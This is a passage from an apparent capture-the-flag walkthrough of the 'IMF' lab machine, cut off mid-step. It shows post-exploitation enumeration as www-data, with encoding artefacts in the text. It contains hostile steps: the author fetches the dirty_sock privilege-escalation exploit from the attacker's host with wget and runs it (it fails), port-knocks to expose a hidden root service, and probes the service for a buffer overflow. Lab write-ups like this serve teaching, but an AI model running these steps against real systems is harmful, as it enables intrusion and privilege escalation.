<div>Using the string from the fifth flag (agentservices) as my guide, I'll see what services are running using systemctl.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>www-data@imf:/$ systemctl --type=service</div>
    <div>systemctl --type=service</div>
    <div>Â Â UNITÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â LOADÂ Â Â Â Â Â ACTIVE SUBÂ Â Â Â Â DESCRIPTION</div>
    <div>Â Â accounts-daemon.serviceÂ Â Â Â Â Â Â Â Â Â Â Â loadedÂ Â Â Â active running Accounts Service</div>
    <div>Â Â acpid.serviceÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â loadedÂ Â Â Â active running ACPI event daemon</div>
    <div>Â Â apache2.serviceÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â loadedÂ Â Â Â active running LSB: Apache2 web server</div>
    <div>Â Â apparmor.serviceÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â loadedÂ Â Â Â active exitedÂ Â LSB: AppArmor initialization</div>
    <div>Â Â apport.serviceÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â loadedÂ Â Â Â active exitedÂ Â LSB: automatic crash report generation</div>
    <div>Â Â atd.serviceÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â loadedÂ Â Â Â active running Deferred execution scheduler</div>
    <div>Â Â console-setup.serviceÂ Â Â Â Â Â Â Â Â Â Â Â Â Â loadedÂ Â Â Â active exitedÂ Â Set console font and keymap</div>
    <div>Â Â cron.serviceÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â loadedÂ Â Â Â active running Regular background program processing daemon</div>
    <div>Â Â dbus.serviceÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â loadedÂ Â Â Â active running D-Bus System Message Bus</div>
    <div>Â Â getty@tty1.serviceÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â loadedÂ Â Â Â active running Getty on tty1</div>
    <div>Â Â grub-common.serviceÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â loadedÂ Â Â Â active exitedÂ Â LSB: Record successful boot for GRUB</div>
    <div>Â Â ifup@eth0.serviceÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â loadedÂ Â Â Â active exitedÂ Â ifup for eth0</div>
    <div>Â Â irqbalance.serviceÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â loadedÂ Â Â Â active exitedÂ Â LSB: daemon to balance interrupts for SMP systems</div>
    <div>Â Â iscsid.serviceÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â loadedÂ Â Â Â active running iSCSI initiator daemon (iscsid)</div>
    <div>Â Â keyboard-setup.serviceÂ Â Â Â Â Â Â Â Â Â Â Â Â loadedÂ Â Â Â active exitedÂ Â Set console keymap</div>
    <div>Â Â kmod-static-nodes.serviceÂ Â Â Â Â Â Â Â Â Â loadedÂ Â Â Â active exitedÂ Â Create list of required static device nodes for the current kernel</div>
    <div>Â Â knockd.serviceÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â loadedÂ Â Â Â active running LSB: port-knock daemon</div>
    <div>Â Â lvm2-lvmetad.serviceÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â loadedÂ Â Â Â active running LVM2 metadata daemon</div>
    <div>Â Â lvm2-monitor.serviceÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â loadedÂ Â Â Â active exitedÂ Â Monitoring of LVM2 mirrors, snapshots etc. using dmeventd or progress polling</div>
    <div>Â Â lxcfs.serviceÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â loadedÂ Â Â Â active running FUSE filesystem for LXC</div>
    <div>Â Â lxd-containers.serviceÂ Â Â Â Â Â Â Â Â Â Â Â Â loadedÂ Â Â Â active exitedÂ Â LXD - container startup/shutdown</div>
    <div>Â Â mdadm.serviceÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â loadedÂ Â Â Â active running LSB: MD monitoring daemon</div>
    <div>Â Â mysql.serviceÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â loadedÂ Â Â Â active running MySQL Community Server</div>
    <div>Â Â netfilter-persistent.serviceÂ Â Â Â Â Â Â loadedÂ Â Â Â active exitedÂ Â netfilter persistent configuration</div>
    <div>Â Â networking.serviceÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â loadedÂ Â Â Â active exitedÂ Â Raise network interfaces</div>
    <div>Â Â ondemand.serviceÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â loadedÂ Â Â Â active exitedÂ Â LSB: Set the CPU Frequency Scaling governor to "ondemand"</div>
    <div>Â Â open-iscsi.serviceÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â loadedÂ Â Â Â active exitedÂ Â Login to default iSCSI targets</div>
    <div>Â Â polkitd.serviceÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â loadedÂ Â Â Â active running Authenticate and Authorize Users to Run Privileged Tasks</div>
    <div>Â Â rc-local.serviceÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â loadedÂ Â Â Â active exitedÂ Â /etc/rc.local Compatibility</div>
    <div>Â Â resolvconf.serviceÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â loadedÂ Â Â Â active exitedÂ Â Nameserver information manager</div>
    <div>Â Â rsyslog.serviceÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â loadedÂ Â Â Â active running System Logging Service</div>
    <div>Â Â setvtrgb.serviceÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â loadedÂ Â Â Â active exitedÂ Â Set console scheme</div>
    <div>* snapd.firstboot.serviceÂ Â Â Â Â Â Â Â Â Â Â Â not-found active exitedÂ Â snapd.firstboot.service</div>
    <div>Â Â snapd.seeded.serviceÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â loadedÂ Â Â Â active exitedÂ Â Wait until snapd is fully seeded</div>
    <div>Â Â ssh.serviceÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â loadedÂ Â Â Â active running OpenBSD Secure Shell server</div>
    <div>Â Â systemd-journal-flush.serviceÂ Â Â Â Â Â loadedÂ Â Â Â active exitedÂ Â Flush Journal to Persistent Storage</div>
    <div>Â Â systemd-journald.serviceÂ Â Â Â Â Â Â Â Â Â Â loadedÂ Â Â Â active running Journal Service</div>
    <div>Â Â systemd-logind.serviceÂ Â Â Â Â Â Â Â Â Â Â Â Â loadedÂ Â Â Â active running Login Service</div>
    <div>Â Â systemd-modules-load.serviceÂ Â Â Â Â Â Â loadedÂ Â Â Â active exitedÂ Â Load Kernel Modules</div>
    <div>Â Â systemd-random-seed.serviceÂ Â Â Â Â Â Â Â loadedÂ Â Â Â active exitedÂ Â Load/Save Random Seed</div>
    <div>Â Â systemd-remount-fs.serviceÂ Â Â Â Â Â Â Â Â loadedÂ Â Â Â active exitedÂ Â Remount Root and Kernel File Systems</div>
    <div>Â Â systemd-timesyncd.serviceÂ Â Â Â Â Â Â Â Â Â loadedÂ Â Â Â active running Network Time Synchronization</div>
    <div>Â Â systemd-tmpfiles-setup-dev.service loadedÂ Â Â Â active exitedÂ Â Create Static Device Nodes in /dev</div>
    <div>Â Â systemd-tmpfiles-setup.serviceÂ Â Â Â Â loadedÂ Â Â Â active exitedÂ Â Create Volatile Files and Directories</div>
    <div>Â Â systemd-udev-trigger.serviceÂ Â Â Â Â Â Â loadedÂ Â Â Â active exitedÂ Â udev Coldplug all Devices</div>
    <div>Â Â systemd-udevd.serviceÂ Â Â Â Â Â Â Â Â Â Â Â Â Â loadedÂ Â Â Â active running udev Kernel Device Manager</div>
    <div>Â Â systemd-update-utmp.serviceÂ Â Â Â Â Â Â Â loadedÂ Â Â Â active exitedÂ Â Update UTMP about System Boot/Shutdown</div>
    <div>Â Â systemd-user-sessions.serviceÂ Â Â Â Â Â loadedÂ Â Â Â active exitedÂ Â Permit User Sessions</div>
    <div>Â Â ufw.serviceÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â loadedÂ Â Â Â active exitedÂ Â Uncomplicated firewall</div>
    <div>Â Â unattended-upgrades.serviceÂ Â Â Â Â Â Â Â loadedÂ Â Â Â active exitedÂ Â Unattended Upgrades Shutdown</div>
    <div>Â Â xinetd.serviceÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â loadedÂ Â Â Â active running LSB: Starts or stops the xinetd daemon.</div>
    <div>
        <div><br /></div>
    </div>
    <div>LOADÂ Â Â = Reflects whether the unit definition was properly loaded.</div>
    <div>ACTIVE = The high-level unit activation state, i.e. generalization of SUB.</div>
    <div>SUBÂ Â Â Â = The low-level unit activation state, values depend on unit type.</div>
    <div>
        <div><br /></div>
    </div>
    <div>51 loaded units listed. Pass --all to see loaded but inactive units, too.</div>
    <div>To show all installed unit files use 'systemctl list-unit-files'.</div>
</div>
<div><br /></div>
<div>One service that stands out as uncommon (and has a * out next to it) isÂ snapd. Checking the version number for snapd, we get the following.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>www-data@imf:/$ snap --version</div>
    <div>snapÂ Â Â Â 2.37.4ubuntu0.1</div>
    <div>snapdÂ Â Â 2.37.4ubuntu0.1</div>
    <div>seriesÂ Â 16</div>
    <div>ubuntuÂ Â 16.04</div>
    <div>kernelÂ Â 4.4.0-45-generic</div>
</div>
<div><br /></div>
<div>Checking the exploit database, we actually have some privilege escalation vulnerabilities with this version.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>snapd &lt; 2.37 (Ubuntu) - 'dirty_sock' Local Privilege Escalation (1)Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â | exploits/linux/local/46361.py</div>
    <div>snapd &lt; 2.37 (Ubuntu) - 'dirty_sock' Local Privilege Escalation (2)Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â | exploits/linux/local/46362.py</div>
</div>
<div><br /></div>
<div>Both exploits are written in python, so I'm hoping python3 will do. I'll copy exploit 2 (which requires less set up) to my working directory and serve it up to the victim via python's SimpleHTTPServer.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/imf# cp /usr/share/exploitdb/exploits/linux/local/46362.py .</div>
    <div>root@kali:~/Walkthroughs/imf# python -m SimpleHTTPServer 4321</div>
    <div>Serving HTTP on 0.0.0.0 port 4321 ...</div>
    <div>10.183.0.188 - - [04/May/2019 09:41:25] "GET /46362.py HTTP/1.1" 200 -</div>
</div>
<div><br /></div>
<div>Then, on the victim...</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>www-data@imf:/$ cd /tmp</div>
    <div>www-data@imf:/tmp$ wget -O 46362.py 10.183.0.222:4321/46362.py</div>
    <div>--2019-05-04 09:41:25--Â Â http://10.183.0.222:4321/46362.py</div>
    <div>Connecting to 10.183.0.222:4321... connected.</div>
    <div>HTTP request sent, awaiting response... 200 OK</div>
    <div>Length: 13831 (14K) [text/plain]</div>
    <div>Saving to: '46362.py'</div>
    <div>
        <div><br /></div>
    </div>
    <div>46362.pyÂ Â Â Â Â Â Â Â Â Â Â Â 100%[===================&gt;]Â Â 13.51KÂ Â --.-KB/sÂ Â Â Â in 0sÂ Â Â Â Â Â </div>
    <div>
        <div><br /></div>
    </div>
    <div>2019-05-04 09:41:25 (249 MB/s) - '46362.py' saved [13831/13831]</div>
    <div>www-data@imf:/tmp$ python3 46362.py</div>
    <div>
        <div><br /></div>
    </div>
    <div>Â Â Â Â Â Â ___Â Â _ ____ ___ _Â Â Â _Â Â Â Â Â ____ ____ ____ _Â Â _ </div>
    <div>Â Â Â Â Â Â |Â Â \ | |__/Â Â |Â Â Â \_/Â Â Â Â Â Â [__Â Â |Â Â | |Â Â Â Â |_/Â Â </div>
    <div>Â Â Â Â Â Â |__/ | |Â Â \Â Â |Â Â Â Â |Â Â Â ___ ___] |__| |___ | \_ </div>
    <div>Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â (version 2)</div>
    <div>
        <div><br /></div>
    </div>
    <div>//=========[]==========================================\\</div>
    <div>|| R&amp;DÂ Â Â Â Â || initstring (@init_string)Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â ||</div>
    <div>|| SourceÂ Â || https://github.com/initstring/dirty_sock ||</div>
    <div>|| Details || https://initblog.com/2019/dirty-sockÂ Â Â Â Â ||</div>
    <div>\\=========[]==========================================//</div>
    <div>
        <div><br /></div>
    </div>
    <div>
        <div><br /></div>
    </div>
    <div>[+] Slipped dirty sock on random socket file: /tmp/izsbvzusad;uid=0;</div>
    <div>[+] Binding to socket file...</div>
    <div>[+] Connecting to snapd API...</div>
    <div>[+] Deleting trojan snap (and sleeping 5 seconds)...</div>
    <div>[!] System may not be vulnerable, here is the API reply:</div>
    <div>
        <div><br /></div>
        <div><br /></div>
    </div>
    <div>HTTP/1.1 401 Unauthorized</div>
    <div>Content-Type: application/json</div>
    <div>Date: Sat, 04 May 2019 13:41:31 GMT</div>
    <div>Content-Length: 119</div>
    <div>
        <div><br /></div>
    </div>
    <div>{"type":"error","status-code":401,"status":"Unauthorized","result":{"message":"access denied","kind":"login-required"}}</div>
</div>
<div><br /></div>
<div>Well, looks like I'm not authorized to manage snaps, so the exploit won't work. Time to move on...</div>
<div><br /></div>
<div>Looking around common locations, I noticed two interesting files in /usr/local/bin.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>www-data@imf:/usr/local/bin$ ls -laF</div>
    <div>total 24</div>
    <div>drwxr-xr-xÂ Â 2 root rootÂ Â 4096 Oct 16Â Â 2016 ./</div>
    <div>drwxr-xr-x 10 root rootÂ Â 4096 Sep 22Â Â 2016 ../</div>
    <div>-rw-r--r--Â Â 1 root rootÂ Â Â Â 19 Oct 16Â Â 2016 access_codes</div>
    <div>-rwxr-xr-xÂ Â 1 root root 11896 Oct 12Â Â 2016 agent*</div>
    <div>www-data@imf:/usr/local/bin$ file access_codes</div>
    <div>access_codes: ASCII text</div>
    <div>www-data@imf:/usr/local/bin$ file agent</div>
    <div>agent: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.32, BuildID[sha1]=444d1910b8b99d492e6e79fe2383fd346fc8d4c7, not stripped</div>
</div>
<div><br /></div>
<div>I have a text file namedÂ access_codes and an elf binary namedÂ agent. Checking the contents of theÂ access_codes file...</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>www-data@imf:/usr/local/bin$ cat access_codes</div>
    <div>SYN 7482,8279,9467</div>
</div>
<div><br /></div>
<div>That's interesting. Seeing 'SYN' immediately makes me think port numbers. We know none of these ports are open. However, this could be a sequence used for a 'port knocker'. Let's check the running services and see if we have anything that looks like a port knocking listener.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>www-data@imf:/$ ps aux | grep -i knock</div>
    <div>rootÂ Â Â Â Â Â 1265Â Â 3.0Â Â 0.2Â Â Â 8752Â Â 2196 ?Â Â Â Â Â Â Â Â SsÂ Â Â May02Â Â 45:23 /usr/sbin/knockd -d</div>
    <div>www-dataÂ Â 9151Â Â 0.0Â Â 0.0Â Â 11284Â Â Â 984 ?Â Â Â Â Â Â Â Â SÂ Â Â Â 16:55Â Â Â 0:00 grep -i knock</div>
</div>
<div><br /></div>
<div>Yes, indeed! We have knockd running as root. Knockd is typically used to hide your SSH service. It might also be hiding access to the 'agent' service on TCP port 7788. Let's use knock (part of knockd) to do the port knocking and then run a scan of port 22 and 7788 to see if either opens up.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/imf# knock 10.183.0.188 7482 8279 9467</div>
    <div>root@kali:~/Walkthroughs/imf# nmap -Pn -sT -sV -sC -A -oA imf-post-portknock -p 22,7788 10.183.0.188</div>
    <div>Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-05 01:25 EDT</div>
    <div>Nmap scan report for imf.homenet.dom (10.183.0.188)</div>
    <div>Host is up (0.0027s latency). </div>
    <div>
        <div><br /></div>
    </div>
    <div>PORTÂ Â Â Â Â STATEÂ Â Â Â SERVICE VERSION</div>
    <div>22/tcpÂ Â Â filtered ssh</div>
    <div>
        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">7788/tcp openÂ Â Â Â Â unknown</font>
    </div>
    <div>| fingerprint-strings:</div>
    <div>|Â Â Â DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, GetRequest, HTTPOptions, RPCCheck, RTSPRequest:</div>
    <div>|Â Â Â Â Â ___ __ __ ___</div>
    <div>|Â Â Â Â Â Agent</div>
    <div>|Â Â Â Â Â Reporting</div>
    <div>|Â Â Â Â Â |___|_| |_|_| System</div>
    <div>|Â Â Â Â Â Agent ID : Invalid Agent ID</div>
    <div>|Â Â Â NULL:</div>
    <div>|Â Â Â Â Â ___ __ __ ___</div>
    <div>|Â Â Â Â Â Agent</div>
    <div>|Â Â Â Â Â Reporting</div>
    <div>|Â Â Â Â Â |___|_| |_|_| System</div>
    <div>|_Â Â Â Â Agent ID :</div>
    <div>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/s:</div>
    <div>SF-Port7788-TCP:V=7.70%I=7%D=5/5%Time=5CCE73DB%P=x86_64-pc-linux-gnu%r(NUL</div>
    <div>SF:L,6F,"\x20\x20___\x20__\x20\x20__\x20___\x20\n\x20\|_\x20_\|\x20\x20\\/</div>
    <div>SF:\x20\x20\|\x20__\|\x20\x20Agent\n\x20\x20\|\x20\|\|\x20\|\\/\|\x20\|\x2</div>
    <div>SF:0_\|\x20\x20\x20Reporting\n\x20\|___\|_\|\x20\x20\|_\|_\|\x20\x20\x20\x</div>
    <div>SF:20System\n\n\nAgent\x20ID\x20:\x20")%r(GenericLines,81,"\x20\x20___\x20</div>
    <div>SF:__\x20\x20__\x20___\x20\n\x20\|_\x20_\|\x20\x20\\/\x20\x20\|\x20__\|\x2</div>
    <div>SF:0\x20Agent\n\x20\x20\|\x20\|\|\x20\|\\/\|\x20\|\x20_\|\x20\x20\x20Repor</div>
    <div>SF:ting\n\x20\|___\|_\|\x20\x20\|_\|_\|\x20\x20\x20\x20System\n\n\nAgent\x</div>
    <div>SF:20ID\x20:\x20Invalid\x20Agent\x20ID\x20\n")%r(GetRequest,81,"\x20\x20__</div>
    <div>SF:_\x20__\x20\x20__\x20___\x20\n\x20\|_\x20_\|\x20\x20\\/\x20\x20\|\x20__</div>
    <div>SF:\|\x20\x20Agent\n\x20\x20\|\x20\|\|\x20\|\\/\|\x20\|\x20_\|\x20\x20\x20</div>
    <div>SF:Reporting\n\x20\|___\|_\|\x20\x20\|_\|_\|\x20\x20\x20\x20System\n\n\nAg</div>
    <div>SF:ent\x20ID\x20:\x20Invalid\x20Agent\x20ID\x20\n")%r(HTTPOptions,81,"\x20</div>
    <div>SF:\x20___\x20__\x20\x20__\x20___\x20\n\x20\|_\x20_\|\x20\x20\\/\x20\x20\|</div>
    <div>SF:\x20__\|\x20\x20Agent\n\x20\x20\|\x20\|\|\x20\|\\/\|\x20\|\x20_\|\x20\x</div>
    <div>SF:20\x20Reporting\n\x20\|___\|_\|\x20\x20\|_\|_\|\x20\x20\x20\x20System\n</div>
    <div>SF:\n\nAgent\x20ID\x20:\x20Invalid\x20Agent\x20ID\x20\n")%r(RTSPRequest,81</div>
    <div>SF:,"\x20\x20___\x20__\x20\x20__\x20___\x20\n\x20\|_\x20_\|\x20\x20\\/\x20</div>
    <div>SF:\x20\|\x20__\|\x20\x20Agent\n\x20\x20\|\x20\|\|\x20\|\\/\|\x20\|\x20_\|</div>
    <div>SF:\x20\x20\x20Reporting\n\x20\|___\|_\|\x20\x20\|_\|_\|\x20\x20\x20\x20Sy</div>
    <div>SF:stem\n\n\nAgent\x20ID\x20:\x20Invalid\x20Agent\x20ID\x20\n")%r(RPCCheck</div>
    <div>SF:,81,"\x20\x20___\x20__\x20\x20__\x20___\x20\n\x20\|_\x20_\|\x20\x20\\/\</div>
    <div>SF:x20\x20\|\x20__\|\x20\x20Agent\n\x20\x20\|\x20\|\|\x20\|\\/\|\x20\|\x20</div>
    <div>SF:_\|\x20\x20\x20Reporting\n\x20\|___\|_\|\x20\x20\|_\|_\|\x20\x20\x20\x2</div>
    <div>SF:0System\n\n\nAgent\x20ID\x20:\x20Invalid\x20Agent\x20ID\x20\n")%r(DNSVe</div>
    <div>SF:rsionBindReqTCP,81,"\x20\x20___\x20__\x20\x20__\x20___\x20\n\x20\|_\x20</div>
    <div>SF:_\|\x20\x20\\/\x20\x20\|\x20__\|\x20\x20Agent\n\x20\x20\|\x20\|\|\x20\|</div>
    <div>SF:\\/\|\x20\|\x20_\|\x20\x20\x20Reporting\n\x20\|___\|_\|\x20\x20\|_\|_\|</div>
    <div>SF:\x20\x20\x20\x20System\n\n\nAgent\x20ID\x20:\x20Invalid\x20Agent\x20ID\</div>
    <div>SF:x20\n")%r(DNSStatusRequestTCP,81,"\x20\x20___\x20__\x20\x20__\x20___\x2</div>
    <div>SF:0\n\x20\|_\x20_\|\x20\x20\\/\x20\x20\|\x20__\|\x20\x20Agent\n\x20\x20\|</div>
    <div>SF:\x20\|\|\x20\|\\/\|\x20\|\x20_\|\x20\x20\x20Reporting\n\x20\|___\|_\|\x</div>
    <div>SF:20\x20\|_\|_\|\x20\x20\x20\x20System\n\n\nAgent\x20ID\x20:\x20Invalid\x</div>
    <div>SF:20Agent\x20ID\x20\n");</div>
    <div>MAC Address: 08:00:27:A1:F5:E7 (Oracle VirtualBox virtual NIC)</div>
    <div>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</div>
    <div>Device type: general purposeÂ Â </div>
    <div>Running: Linux 3.X|4.X</div>
    <div>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</div>
    <div>OS details: Linux 3.10 - 4.11, Linux 3.16 - 4.6, Linux 3.2 - 4.9, Linux 4.4</div>
    <div>Network Distance: 1 hop</div>
    <div>
        <div><br /></div>
    </div>
    <div>TRACEROUTE</div>
    <div>HOP RTTÂ Â Â Â Â ADDRESS</div>
    <div>1Â Â Â 2.69 ms imf.homenet.dom (10.183.0.188)</div>
    <div>
        <div><br /></div>
    </div>
    <div>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</div>
    <div>Nmap done: 1 IP address (1 host up) scanned in 15.10 seconds</div>
</div>
<div><br /></div>
<div>Looks like TCP port 7788 opened up for us. We know what it is, we don't know (yet) how to exploit it.</div>
<div><br /></div>
<div>Running the agent binary in /usr/local/bin...</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>www-data@imf:/usr/local/bin$ ./agent</div>
    <div>Â Â ___ __Â Â __ ___ </div>
    <div> |_ _|Â Â \/Â Â | __|Â Â Agent</div>
    <div>Â Â | || |\/| | _|Â Â Â Reporting</div>
    <div> |___|_|Â Â |_|_|Â Â Â Â System</div>
    <div>
        <div><br /></div>
    </div>
    <div><br /></div>
    <div>Agent ID :Â </div>
</div>
<div><br /></div>
<div>That looks familiar. Checking xinetd.d, we can confirm this is the binary running on port 7788 (but the one running there is as root ðŸ™‚).</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>www-data@imf:/$ cat /etc/xinetd.d/agent</div>
    <div># default: on</div>
    <div># description: The agent server serves agent sessions</div>
    <div># unencrypted agentid for authentication.</div>
    <div>service agent</div>
    <div>{</div>
    <div>Â Â Â Â Â Â Â flagsÂ Â Â Â Â Â Â Â Â Â = REUSE</div>
    <div>Â Â Â Â Â Â Â socket_typeÂ Â Â Â = stream</div>
    <div>Â Â Â Â Â Â Â waitÂ Â Â Â Â Â Â Â Â Â Â = no</div>
    <div>Â Â Â Â Â Â Â userÂ Â Â Â Â Â Â Â Â Â Â = root</div>
    <div>Â Â Â Â Â Â Â serverÂ Â Â Â Â Â Â Â Â = /usr/local/bin/agent</div>
    <div>Â Â Â Â Â Â Â log_on_failure += USERID</div>
    <div>Â Â Â Â Â Â Â disableÂ Â Â Â Â Â Â Â = no</div>
    <div>Â Â Â Â Â Â Â portÂ Â Â Â Â Â Â Â Â Â Â = 7788</div>
    <div>}</div>
</div>
<div><br /></div>
<div>This smells like a buffer overflow waiting to happen. ðŸ˜• I'll try sending it lots of 'A's to see if I can get it to crash...</div>
<div><br /></div>
<div>Nope! Trying over 35000 'A's didn't crash it, so I guess we are good. I'm kind of thankful for that.</div>
<div><br /></div>
<div>Running strings on the agent binary, we get some interesting things, but nothing that looks like an ID. If we could run the program in a debugger, we could probably trace the registers and memory and see what's going on. Unfortunately, gdb is not installed on the victim. We could transfer the agent binary to our attacking machine and debug it there, but we might not have all the symbol tables for the 32-bit libraries used (since our attacking machine is 64-bit). Another option is to use strace and/or ltrace to see "under the hood" while the program is running.Â strace is a system call and signal tracer.Â ltrace is a library call tracer and is primarily used to trace calls made by programs to library functions. ltrace can also do what strace does (when using the -S option), so we'll just use ltrace.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>www-data@imf:/usr/local/bin$ ltrace -CS -n 4 -o /tmp/agent-trace ./agent</div>
